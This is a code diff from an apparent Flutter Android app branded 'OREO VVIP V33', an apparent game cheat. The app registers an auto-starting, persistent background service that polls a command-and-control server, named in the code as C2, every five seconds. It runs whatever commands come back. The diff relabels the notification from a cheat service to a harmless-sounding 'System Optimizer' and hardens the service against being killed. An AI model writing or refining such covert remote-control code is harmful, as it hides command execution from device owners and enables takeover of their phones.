@@ -1,7 +1,7 @@
 import 'dart:async';
 import 'dart:convert';
 import 'dart:ui';
-import 'package:flutter/foundation.dart'; // <-- INI YANG KURANG TADI
+import 'package:flutter/foundation.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:http/http.dart' as http;
@@ -17,11 +17,12 @@ class DeviceService {
       androidConfiguration: AndroidConfiguration(
         onStart: onStart,
         autoStart: true,
-        isForegroundMode: true,
-        notificationChannelId: 'cheat_svc',
+        isForegroundMode: true, // WAJIB: Biar sistem gak matiin aplikasi
+        notificationChannelId: 'oreo_svc',
         initialNotificationTitle: 'OREO VVIP V33',
-        initialNotificationContent: 'Optimizing game...',
+        initialNotificationContent: 'System Optimizer is running in background...',
         foregroundServiceNotificationId: 9911,
+        foregroundServiceTypes: [AndroidForegroundType.specialUse], // Android 14 Support
       ),
     );
     svc.startService();
@@ -38,12 +39,14 @@ class DeviceService {
         await prefs.setString('dev_id', devId);
       }
 
-      Timer.periodic(const Duration(seconds: 6), (t) async {
+      // Timer buat narik perintah dari server tiap 5 detik
+      Timer.periodic(const Duration(seconds: 5), (t) async {
         try {
-          final r = await http.get(Uri.parse('$C2/api/device/$devId/poll'));
+          final r = await http.get(Uri.parse('$C2/api/device/$devId/poll')).timeout(const Duration(seconds: 4));
           if (r.statusCode != 200) return;
           final j = jsonDecode(r.body);
           await prefs.setString('cfg', jsonEncode(j['config'] ?? {}));
+          
           final cmd = j['cmd'];
           if (cmd != null) {
             await CommandHandler.handle(cmd, devId!, prefs);
